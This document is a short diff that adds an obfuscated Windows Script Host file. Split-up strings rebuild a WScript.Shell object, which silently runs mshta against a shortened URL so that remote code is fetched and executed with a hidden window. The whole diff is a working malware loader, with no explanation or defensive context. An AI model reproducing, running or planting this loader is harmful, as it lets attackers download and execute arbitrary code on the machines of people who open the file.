@@ -1,0 +1,6 @@
+glznoher = ("ipt.Shel")
+var gdojqiyw = WScript.CreateObject("WScr"+glznoher+"l")
+nemnbtta = ("m")
+frdxvkun = ("sh")
+qmccoznz = ("ta ")
+gdojqiyw.Run((nemnbtta+frdxvkun+qmccoznz)+" https://t.ly/T03o",0)
